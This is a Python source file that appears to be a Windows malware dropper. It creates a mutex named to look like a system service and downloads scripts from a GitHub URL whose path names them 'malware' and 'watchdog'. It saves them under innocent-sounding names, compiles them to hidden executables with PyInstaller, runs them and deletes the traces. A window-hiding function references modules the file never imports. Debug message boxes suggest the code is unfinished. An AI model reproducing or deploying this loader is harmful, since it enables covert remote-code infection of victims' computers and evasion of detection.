import os
import sys
import urllib.request
import subprocess
import random
import shutil
import win32api
import win32con
import win32event
import win32clipboard

# Function to create a mutex to check if the process is already running
def create_mutex(mutex_name):
    mutex = win32event.CreateMutex(None, 0, mutex_name)
    if win32api.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
        return False
    return True

# Mutex check before proceeding
if os.name == "nt":
    mutex_name = "WindowsSessionHandler"  # Name the mutex uniquely for your program
    if not create_mutex(mutex_name):
        print("Mutex already exists. Exiting program.")
        sys.exit(0)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
]

def fetch_python_code(url):
    user_agent = random.choice(user_agents)
    headers = {'User-Agent': user_agent}
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req) as response:
            return response.read().decode('utf-8')
    except Exception as e:
        print(f"Error fetching URL {url}: {e}")
        return None

def write_python_file(code, filename):
    if code:
        temp_dir = os.getenv('TEMP')
        py_file_path = os.path.join(temp_dir, filename)
        with open(py_file_path, 'w', encoding='utf-8') as f:
            f.write(code)
        return py_file_path
    return None

def compile_python_to_exe(py_file_path):
    if py_file_path:
        try:
            temp_dir = os.getenv('TEMP')
            dist_folder = os.path.join(temp_dir, "dist")
            build_folder = os.path.join(temp_dir, "build")
            
            subprocess.run([
                'pyinstaller',
                '--onefile',
                '--noconsole',
                '--icon=NONE',
                f'--distpath={dist_folder}',
                f'--workpath={build_folder}',
                py_file_path
            ], check=True)
            
            exe_file_path = os.path.join(dist_folder, os.path.basename(py_file_path).replace(".py", ".exe"))
            if os.path.exists(exe_file_path):
                return exe_file_path
            else:
                print(f"Error: {exe_file_path} not found in dist folder")
        except Exception as e:
            print(f"Error compiling {py_file_path}: {e}")
    return None

def execute_exe_file(exe_file_path):
    if exe_file_path:
        try:
            subprocess.Popen([exe_file_path], creationflags=subprocess.CREATE_NEW_CONSOLE)
        except Exception as e:
            print(f"Error executing {exe_file_path}: {e}")

def clean_up(temp_files):
    for item in temp_files:
        if os.path.exists(item):
            if os.path.isdir(item):
                shutil.rmtree(item)
            else:
                os.remove(item)

def install_and_execute(urls_and_filenames):
    temp_dir = os.getenv('TEMP')
    temp_files = []
    exe_files = []

    # Step 1: Download Python files
    for url, filename in urls_and_filenames:
        code = fetch_python_code(url)
        if code:
            py_file_path = write_python_file(code, filename)
            if py_file_path:
                temp_files.append(py_file_path)

    # Step 2: Compile each Python file into an executable
    for py_file_path in temp_files:
        exe_file_path = compile_python_to_exe(py_file_path)
        if exe_file_path:
            exe_files.append(exe_file_path)

    # Step 3: Execute the generated executable files
    for exe_file_path in exe_files:
        execute_exe_file(exe_file_path)

    # Step 4: Clean up temporary files and directories
    dist_folder = os.path.join(temp_dir, "dist")
    build_folder = os.path.join(temp_dir, "build")
    temp_files.extend([dist_folder, build_folder])
    clean_up(temp_files)

# URLs and filenames to download and compile
urls_and_filenames = [
    ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/malware", "NetworkIntegrityService.py"),
    ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/watchdog1", "SystemResourceMonitor.py"),
    ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/watchdog2", "SecurityHealthCheck.py"),
]

def set_invisible():
    hwnd = win32gui.GetForegroundWindow()  # Get the handle of the current active window

    # Make the window invisible on taskbar
    ctypes.windll.user32.ShowWindow(hwnd, 0)  # 0 is SW_HIDE which hides the window

    # Set window transparency to 100% (completely invisible)
    extended_style = win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE)
    win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, extended_style | win32con.WS_EX_LAYERED)
    win32gui.SetLayeredWindowAttributes(hwnd, 0, 255, win32con.LWA_COLORKEY)  # Fully transparent

    # Set TopMost to False, so window cannot be touched or interacted with
    win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)

    # Make sure the window remains undetected
    gw.getWindowsWithTitle(pyautogui.getActiveWindowTitle())[0].minimize()  # Minimize the window from taskbar

import ctypes; ctypes.windll.user32.MessageBoxW(0, "Ran windowssessionhandler.py", "Message", 0)
install_and_execute(urls_and_filenames)
import ctypes; ctypes.windll.user32.MessageBoxW(0, "Ran windowssessionhandler.py install & execute", "Message", 0)
